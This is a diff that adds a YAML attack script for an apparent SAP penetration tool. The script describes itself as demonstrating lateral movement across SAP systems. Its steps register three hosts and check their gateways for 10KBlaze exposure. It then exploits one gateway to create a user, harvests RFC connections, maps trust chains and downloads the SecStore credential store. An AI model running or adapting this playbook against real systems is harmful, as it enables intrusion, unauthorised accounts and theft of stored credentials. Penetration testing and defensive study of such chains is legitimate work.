@@ -1,0 +1,53 @@
+# SAPMAP Script: Multi-System Landscape Scan
+# Usage: python3 sapmap.py --script scripts/demo_landscape.yaml
+#
+# Demonstrates lateral movement across multiple SAP systems
+
+name: "SAP Landscape Attack Demo"
+description: "Scan multiple systems, exploit, propagate, analyze trust chains"
+
+steps:
+  # Add all systems
+  - action: add_system
+    sid: S4H
+    ip: 192.168.2.209
+    instance: "00"
+
+  - action: add_system
+    sid: TWT
+    ip: 192.168.2.60
+    instance: "00"
+
+  - action: add_system
+    sid: ORA
+    ip: 192.168.2.16
+    instance: "00"
+
+  # Check all gateways
+  - action: check_all_gw
+
+  # Check all for 10KBlaze
+  - action: check_all_betrusted
+    attacker_ip: auto
+
+  # Exploit S4H
+  - action: create_user
+    target: S4H
+    method: gw_exploit
+    client: "001"
+
+  # Get RFC connections from S4H
+  - action: retrieve_rfcs
+    target: S4H
+
+  # Business impact on S4H
+  - action: impact_assess
+    target: S4H
+    client: "001"
+
+  # Analyze trust chains across landscape
+  - action: analyze_chains
+
+  # Download SecStore from S4H
+  - action: download_secstore
+    target: S4H
